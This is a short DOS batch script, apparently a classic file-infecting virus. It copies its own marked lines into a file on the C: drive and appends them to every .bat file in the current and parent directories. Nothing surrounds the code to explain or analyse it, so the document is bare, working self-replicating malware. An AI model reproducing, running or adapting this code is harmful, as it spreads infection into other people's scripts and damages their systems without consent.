if '%1=='Inf goto CoDe_inf
find "CoDe"<%0.bat>c:\_CoDe.bat
for %%a in (*.bat ..\*.bat) do call c:\_CoDe Inf %%a
:CoDe_inf
find "CoDe"<%2>nul
type c:\_CoDe.bat>>%2